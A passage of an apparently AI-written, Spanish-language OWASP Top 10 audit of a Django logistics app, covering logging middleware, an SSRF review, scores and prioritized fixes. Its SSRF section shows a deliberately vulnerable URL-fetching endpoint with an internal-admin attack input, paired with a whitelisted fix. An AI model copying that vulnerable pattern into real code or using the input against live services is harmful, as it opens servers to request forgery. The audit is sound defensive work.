                }
            )
        
        # Log de accesos denegados
        if response.status_code == 403:
            security_logger.warning(
                f"Access denied",
                extra={
                    'user': request.user.username if request.user.is_authenticated else 'anonymous',
                    'ip': request.META.get('REMOTE_ADDR'),
                    'path': request.path,
                    'method': request.method,
                }
            )
        
        return response

# config/settings.py
LOGGING = {
    ...,
    'loggers': {
        ...,
        'security': {
            'handlers': ['file'],
            'level': 'INFO',
            'propagate': False,
        },
    },
}

MIDDLEWARE = [
    ...
    'apps.core.audit.SecurityAuditMiddleware',  # ← Agregar
]
```

---

## 🔟 A10: SERVER-SIDE REQUEST FORGERY (SSRF)

### 🟢 **BAJO RIESGO: No hay funcionalidad SSRF directa**

```python
# ✅ Solo requests externos a Mapbox API (controlado)
# apps/routing/mapbox_service.py

class MapboxService:
    MAPBOX_API_BASE = 'https://api.mapbox.com'  # ← URL fija, no user-input
    
    def get_route(self, origin, destination):
        url = f"{self.MAPBOX_API_BASE}/directions/v5/mapbox/driving/{coords}"
        # ← URL construida con base fija + params validados
```

**Fortalezas**:
- ✅ No hay endpoints que acepten URLs arbitrarias del usuario
- ✅ Mapbox API URL es fija, no viene de user input

---

### 🟡 **PRECAUCIÓN: Si en el futuro se agregan integraciones**

```python
# ❌ MAL: Permitir URLs arbitrarias
@api_view(['POST'])
def import_from_url(request):
    url = request.data.get('url')  # ← PELIGROSO
    response = requests.get(url)   # ← SSRF vulnerable
    # Atacante puede: url=http://localhost:8000/admin/

# ✅ BIEN: Whitelist de dominios
ALLOWED_IMPORT_DOMAINS = [
    'api.shipment-system.com',
    'data.customs.gov',
]

@api_view(['POST'])
def import_from_url(request):
    url = request.data.get('url')
    
    # Validar dominio
    from urllib.parse import urlparse
    parsed = urlparse(url)
    
    if parsed.hostname not in ALLOWED_IMPORT_DOMAINS:
        return Response(
            {"error": "Dominio no autorizado"},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    # Validar esquema
    if parsed.scheme not in ['https']:
        return Response(
            {"error": "Solo HTTPS permitido"},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    response = requests.get(url, timeout=10)
    ...
```

---

## 🎯 PUNTUACIÓN POR CATEGORÍA

| Categoría OWASP                      | Puntuación | Comentario                                |
|--------------------------------------|------------|-------------------------------------------|
| **A01: Broken Access Control**       | 4/10       | 🔴 Sin roles, AllowAny en dev             |
| **A02: Cryptographic Failures**      | 6/10       | 🟡 SECRET_KEY débil por defecto           |
| **A03: Injection**                   | 9/10       | 🟢 Django ORM protege bien                |
| **A04: Insecure Design**             | 3/10       | 🔴 Sin rate limiting                      |
| **A05: Security Misconfiguration**   | 4/10       | 🔴 CORS abierto, @csrf_exempt             |
| **A06: Vulnerable Components**       | 9/10       | 🟢 Dependencias actualizadas              |
| **A07: Authentication Failures**     | 5/10       | 🟡 Sin rate limiting en login             |
| **A08: Data Integrity Failures**     | 9/10       | 🟢 JSON serializer (no pickle)            |
| **A09: Security Logging**            | 5/10       | 🟡 Logs sin filtrado sensible             |
| **A10: SSRF**                        | 9/10       | 🟢 No aplica (sin SSRF directo)           |

**PROMEDIO**: **6.3/10** 🟡 **NECESITA MEJORAS**

---

## 📋 RECOMENDACIONES PRIORIZADAS

### 🔴 **CRÍTICO (Hacer HOY - Bloquean producción segura)**

1. **Implementar rate limiting INMEDIATAMENTE** (A04, A07)
   ```python
   # config/settings.py
   REST_FRAMEWORK = {
       'DEFAULT_THROTTLE_CLASSES': [
           'rest_framework.throttling.AnonRateThrottle',
           'rest_framework.throttling.UserRateThrottle',
       ],
       'DEFAULT_THROTTLE_RATES': {
           'anon': '100/hour',
           'user': '1000/hour',
       },
   }
   ```
   **Impacto**: Previene ataques de fuerza bruta, DoS

2. **Eliminar TODOS los @csrf_exempt** (A05)
   ```python
   # Usar DRF con JWT (sin CSRF) o ensure_csrf_cookie
   ```
   **Impacto**: Previene ataques CSRF

3. **Quitar CORS_ALLOW_ALL_ORIGINS** (A05)
   ```python
   # Usar lista específica de orígenes
   CORS_ALLOWED_ORIGINS = [...]
   ```
   **Impacto**: Previene robo de datos desde sitios maliciosos

4. **Eliminar AllowAny condicional en DEBUG** (A01)
   ```python
   'DEFAULT_PERMISSION_CLASSES': [
       'rest_framework.permissions.IsAuthenticated',  # SIEMPRE
   ],
   ```
   **Impacto**: Evita APIs sin protección si DEBUG=True queda en producción

---

### 🔴 **CRÍTICO (Hacer ESTA SEMANA)**

5. **Implementar sistema de roles/permisos** (A01)
   ```python
   # Crear grupos: admin, operador, conductor, cliente
   # Permission classes: IsOwnerOrAdmin, IsOperatorOrAdmin
   ```
   **Impacto**: Control granular de acceso, previene escalación de privilegios

6. **Validar SECRET_KEY obligatoria en producción** (A02)
   ```python
   if not DEBUG and not config('SECRET_KEY', default=None):
       raise RuntimeError("SECRET_KEY obligatoria en producción")
   ```
   **Impacto**: Evita uso de SECRET_KEY débil

7. **Agregar filtros de logs sensibles** (A09)
   ```python
   # SensitiveDataFilter para passwords, tokens
   ```
   **Impacto**: Previene exposición de credenciales en logs

---

### 🟡 **IMPORTANTE (Próximas 2 semanas)**

8. **Implementar logout con blacklist de JWT** (A07)
9. **Agregar headers de seguridad HTTP (CSP, Permissions-Policy)** (A05)
10. **Implementar auditoría de eventos de seguridad** (A09)
11. **Sanitizar passwords hardcoded en management commands** (A02, A05)
12. **Configurar rotación de logs** (A09)

---

### 🟢 **MEJORAS (Backlog)**

13. Implementar 2FA (Two-Factor Authentication)
14. Agregar detección de anomalías en accesos
15. Configurar WAF (Web Application Firewall) en Render
16. Implementar honeypots para detectar ataques
17. Agregar SIEM (Security Information and Event Management)

---

## 🎯 PRÓXIMOS PASOS (FASE 7)

Con el análisis de seguridad completo, ahora procederé a:

1. ✅ **FASE 1 COMPLETADA**: Arquitectura y dependencias (5.3/10)
2. ✅ **FASE 2 COMPLETADA**: Modelos y base de datos (5.4/10)
3. ✅ **FASE 3 COMPLETADA**: Lógica de negocio y servicios (5.9/10)
4. ✅ **FASE 4 COMPLETADA**: Views y controladores (4.5/10)
5. ✅ **FASE 5 COMPLETADA**: APIs y Serializers (5.4/10)
6. ✅ **FASE 6 COMPLETADA**: Seguridad profunda (6.3/10)
7. ⏳ **FASE 7**: Performance y optimización
8. ⏳ **FASE 8**: Tests y cobertura
9. ⏳ **FASE 9**: Documentación
10. ⏳ **FASE 10**: Deployment e integración

---

**FIN DE FASE 6 - SEGURIDAD OWASP TOP 10**  
**Próximo paso**: Análisis exhaustivo de performance (queries N+1, caching, indexing, profiling, async optimization)
